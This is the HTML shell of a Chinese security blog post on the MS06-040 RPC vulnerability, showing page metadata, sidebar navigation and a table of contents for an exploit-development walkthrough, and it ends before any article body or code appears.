<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>RPC入侵：MS06-040 | 技术栈</title><meta name="description" content="[toc]  RPC 漏洞  RPC 漏洞简介 RPC 即 Remote Procedure Call，它是一种计算机进程间的通信方式。简单地说，RPC 就是让您在自己地程序中调用一个函数（可能需要很大地计算量），而这个函数在另外一个或多个远程机器上执行，执行完后将结果传回您的机器进行后续操作。 RPC漏洞，远程调用函数出现了问题，甚至有可被利用的安全漏洞。  RPC编程简介 在 VC 中进行 R"><meta property="og:type" content="article"><meta property="og:title" content="RPC入侵：MS06-040"><meta property="og:url" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/index.html"><meta property="og:site_name" content="技术栈"><meta property="og:description" content="[toc]  RPC 漏洞  RPC 漏洞简介 RPC 即 Remote Procedure Call，它是一种计算机进程间的通信方式。简单地说，RPC 就是让您在自己地程序中调用一个函数（可能需要很大地计算量），而这个函数在另外一个或多个远程机器上执行，执行完后将结果传回您的机器进行后续操作。 RPC漏洞，远程调用函数出现了问题，甚至有可被利用的安全漏洞。  RPC编程简介 在 VC 中进行 R"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220713220518781.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714123823178-16577739716151.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714124834735.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714132056431.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714125708003.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714133733738.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717224801801.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714152047332.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714153344604.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714223348998.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220716170814837.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717215304487.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717220145700.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717230456660.png"><meta property="article:published_time" content="2022-07-20T08:14:55.000Z"><meta property="article:modified_time" content="2022-08-01T11:19:57.752Z"><meta property="article:author" content="rgzzplus"><meta property="article:tag" content="漏洞"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220713220518781.png"><link rel="canonical" href="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/index.html"><link rel="alternate" href="/atom.xml" title="技术栈" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet"><meta name="generator" content="Hexo 6.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/rgzz-zq" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">人工智障plus</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md"></h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Wuhan, China</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">首页</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">归档</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">分类</span></a></li><li class="menu-item menu-item-repository"><a href="/repository"><i class="icon icon-project"></i> <span class="menu-title">项目</span></a></li><li class="menu-item menu-item-links"><a href="/links"><i class="icon icon-friendship"></i> <span class="menu-title">友链</span></a></li><li class="menu-item menu-item-about"><a href="/about"><i class="icon icon-cup-fill"></i> <span class="menu-title">关于</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/rgzz-zq" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">公告</h3><div class="widget-body"><div id="board"><div class="content"><p>欢迎来到技术栈！</p></div></div></div></div><div class="widget"><h3 class="widget-title">分类</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/0day%E5%AE%89%E5%85%A8/">0day安全</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA/">个人</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/">经验交流</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%BD%AC%E8%BD%BD/">转载</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%A2%98%E5%BA%93-%E4%BD%9C%E4%B8%9A/">题库/作业</a><span class="category-list-count">2</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签</h3><div class="widget-body"><ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ASLR/" rel="tag">ASLR</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C++</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E5%92%8C%E6%8C%87%E9%92%88/" rel="tag">C和指针</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DEP/" rel="tag">DEP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GS/" rel="tag">GS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git/" rel="tag">Git</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HeapSpary/" rel="tag">HeapSpary</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LNMP/" rel="tag">LNMP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" rel="tag">Linux保护机制</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" rel="tag">Linux常用命令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E6%B1%87%E7%BC%96%E4%BC%AA%E6%8C%87%E4%BB%A4/" rel="tag">Linux汇编伪指令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SEHOP/" rel="tag">SEHOP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SafeSEH/" rel="tag">SafeSEH</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gdb/" rel="tag">gdb</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%A7%E5%85%A8/" rel="tag">linux命令行大全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E9%97%AE%E9%A2%98/" rel="tag">linux问题</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ollydebug/" rel="tag">ollydebug</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/task-struct/" rel="tag">task_struct</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/typora/" rel="tag">typora</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/" rel="tag">ubuntu</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%AD%E5%9B%BD%E7%9F%A5%E7%BD%91/" rel="tag">中国知网</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BA%92%E6%96%A5%E9%94%81/" rel="tag">互斥锁</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/" rel="tag">信号量</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BC%8F%E6%B4%9E/" rel="tag">其它类型的漏洞</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%AB%AF/" rel="tag">内存大小端</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/" rel="tag">内存攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/" rel="tag">函数指针</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/" rel="tag">同步互斥</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A0%86/" rel="tag">堆</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B1%8F%E9%9A%9C/" rel="tag">屏障</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BB%BA%E7%AB%99/" rel="tag">建站</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BF%83%E8%B7%AF/" rel="tag">心路</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/" rel="tag">整数安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82%E8%B0%88/" rel="tag">杂谈</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%A1%E4%BB%B6%E5%8F%98%E9%87%8F/" rel="tag">条件变量</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%88/" rel="tag">栈</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="tag">格式化字符串</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" rel="tag">正则表达式</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/" rel="tag">汇编指令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%87%AA%E6%97%8B%E9%94%81/" rel="tag">自旋锁</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AF%BB%E5%86%99%E9%94%81/" rel="tag">读写锁</a><span class="tag-list-count">1</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签云</h3><div class="widget-body tagcloud"><a href="/tags/ASLR/" style="font-size:13px">ASLR</a> <a href="/tags/C/" style="font-size:13px">C++</a> <a href="/tags/C%E5%92%8C%E6%8C%87%E9%92%88/" style="font-size:13.33px">C和指针</a> <a href="/tags/DEP/" style="font-size:13px">DEP</a> <a href="/tags/GS/" style="font-size:13px">GS</a> <a href="/tags/Git/" style="font-size:13px">Git</a> <a href="/tags/HeapSpary/" style="font-size:13px">HeapSpary</a> <a href="/tags/LNMP/" style="font-size:13px">LNMP</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" style="font-size:13px">Linux保护机制</a> <a href="/tags/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" style="font-size:13px">Linux常用命令</a> <a href="/tags/Linux%E6%B1%87%E7%BC%96%E4%BC%AA%E6%8C%87%E4%BB%A4/" style="font-size:13px">Linux汇编伪指令</a> <a href="/tags/SEHOP/" style="font-size:13px">SEHOP</a> <a href="/tags/SafeSEH/" style="font-size:13px">SafeSEH</a> <a href="/tags/c/" style="font-size:13px">c</a> <a href="/tags/gdb/" style="font-size:13.67px">gdb</a> <a href="/tags/hexo/" style="font-size:13.33px">hexo</a> <a href="/tags/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%A7%E5%85%A8/" style="font-size:13px">linux命令行大全</a> <a href="/tags/linux%E9%97%AE%E9%A2%98/" style="font-size:13px">linux问题</a> <a href="/tags/ollydebug/" style="font-size:13px">ollydebug</a> <a href="/tags/pwn/" style="font-size:13px">pwn</a> <a href="/tags/reverse/" style="font-size:13.33px">reverse</a> <a href="/tags/shellcode/" style="font-size:13.33px">shellcode</a> <a href="/tags/task-struct/" style="font-size:13px">task_struct</a> <a href="/tags/typora/" style="font-size:13px">typora</a> <a href="/tags/ubuntu/" style="font-size:13.67px">ubuntu</a> <a href="/tags/%E4%B8%AD%E5%9B%BD%E7%9F%A5%E7%BD%91/" style="font-size:13px">中国知网</a> <a href="/tags/%E4%BA%92%E6%96%A5%E9%94%81/" style="font-size:13px">互斥锁</a> <a href="/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/" style="font-size:13px">信号量</a> <a href="/tags/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BC%8F%E6%B4%9E/" style="font-size:13px">其它类型的漏洞</a> <a href="/tags/%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%AB%AF/" style="font-size:13px">内存大小端</a> <a href="/tags/%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/" style="font-size:13px">内存攻击</a> <a href="/tags/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/" style="font-size:13px">函数指针</a> <a href="/tags/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/" style="font-size:13px">同步互斥</a> <a href="/tags/%E5%A0%86/" style="font-size:13.67px">堆</a> <a href="/tags/%E5%B1%8F%E9%9A%9C/" style="font-size:13px">屏障</a> <a href="/tags/%E5%BB%BA%E7%AB%99/" style="font-size:13px">建站</a> <a href="/tags/%E5%BF%83%E8%B7%AF/" style="font-size:13px">心路</a> <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size:13.33px">攻防世界</a> <a href="/tags/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/" style="font-size:13px">整数安全</a> <a href="/tags/%E6%9D%82%E8%B0%88/" style="font-size:13px">杂谈</a> <a href="/tags/%E6%9D%A1%E4%BB%B6%E5%8F%98%E9%87%8F/" style="font-size:13px">条件变量</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">栈</a> <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size:13px">栈溢出</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">格式化字符串</a> <a href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" style="font-size:13px">正则表达式</a> <a href="/tags/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/" style="font-size:13px">汇编指令</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size:14px">漏洞</a> <a href="/tags/%E8%87%AA%E6%97%8B%E9%94%81/" style="font-size:13px">自旋锁</a> <a href="/tags/%E8%AF%BB%E5%86%99%E9%94%81/" style="font-size:13px">读写锁</a></div></div><div class="widget"><h3 class="widget-title">归档</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">八月 2022</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">七月 2022</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">四月 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a><span class="archive-list-count">16</span></li></ul></div></div><div class="widget"><h3 class="widget-title">最新文章</h3><div class="widget-body"><ul class="recent-post-list list-unstyled"><li><div class="item-thumb"><a href="/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/CTF/">CTF</a></p><p class="item-title"><a href="/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/" class="title">整数安全</a></p><p class="item-date"><time datetime="2022-08-27T04:48:59.000Z" itemprop="datePublished">2022-08-27</time></p></div></li><li><div class="item-thumb"><a href="/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/CTF/">CTF</a></p><p class="item-title"><a href="/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/" class="title">栈溢出x86_64</a></p><p class="item-date"><time datetime="2022-08-27T04:45:51.000Z" itemprop="datePublished">2022-08-27</time></p></div></li><li><div class="item-thumb"><a href="/2022/08/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2x86-64/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/CTF/">CTF</a></p><p class="item-title"><a href="/2022/08/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2x86-64/" class="title">格式化字符串x86_64</a></p><p class="item-date"><time datetime="2022-08-27T04:45:33.000Z" itemprop="datePublished">2022-08-27</time></p></div></li><li><div class="item-thumb"><a href="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/CTF/">CTF</a></p><p class="item-title"><a href="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/" class="title">Linux_shellcode开发之实战</a></p><p class="item-date"><time datetime="2022-08-08T14:39:50.000Z" itemprop="datePublished">2022-08-08</time></p></div></li><li><div class="item-thumb"><a href="/2022/08/08/gdb%E6%98%BE%E7%A4%BAintel%E5%92%8Catt%E6%B1%87%E7%BC%96/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E8%BD%AC%E8%BD%BD/">转载</a></p><p class="item-title"><a href="/2022/08/08/gdb%E6%98%BE%E7%A4%BAintel%E5%92%8Catt%E6%B1%87%E7%BC%96/" class="title">gdb显示intel和at&amp;t汇编</a></p><p class="item-date"><time datetime="2022-08-08T14:36:22.000Z" itemprop="datePublished">2022-08-08</time></p></div></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse in" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#rpc-%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">RPC 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#rpc-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">RPC 漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rpc%E7%BC%96%E7%A8%8B%E7%AE%80%E4%BB%8B"><span class="toc-number">1.2.</span> <span class="toc-text">RPC编程简介</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ms06-040"><span class="toc-number">2.</span> <span class="toc-text">MS06-040</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ms06-040-%E7%AE%80%E4%BB%8B"><span class="toc-number">2.1.</span> <span class="toc-text">MS06-040 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">2.1.1.</span> <span class="toc-text">动态调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E7%A8%8B%E5%BA%8F%E5%B4%A9%E6%BA%83%E7%82%B9"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">定位程序崩溃点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0exploit"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">构造exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">静态分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B-exploit"><span class="toc-number">2.3.</span> <span class="toc-text">实现远程 exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE"><span class="toc-number">2.3.1.</span> <span class="toc-text">配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-number">2.3.2.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95-serviceexe"><span class="toc-number">2.3.3.</span> <span class="toc-text">调试 service.exe</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows-xp-%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84-ms06040-exploit"><span class="toc-number">3.</span> <span class="toc-text">Windows XP 环境下的 MS06—040 exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-2"><span class="toc-number">3.1.</span> <span class="toc-text">静态分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-2"><span class="toc-number">3.2.</span> <span class="toc-text">动态调试</span></a></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-RPC入侵：MS06-040" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">RPC入侵：MS06-040</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/" class="article-date"><time datetime="2022-07-20T08:14:55.000Z" itemprop="datePublished">2022-07-20</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/0day%E5%AE%89%E5%85%A8/">0day安全</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span> </span></span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/" class="leancloud_visitors" data-flag-title="RPC入侵：MS06-040"><span class="leancloud-visitors-count">0</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/#comments" class="article-comment-link">评论</a></span> <span 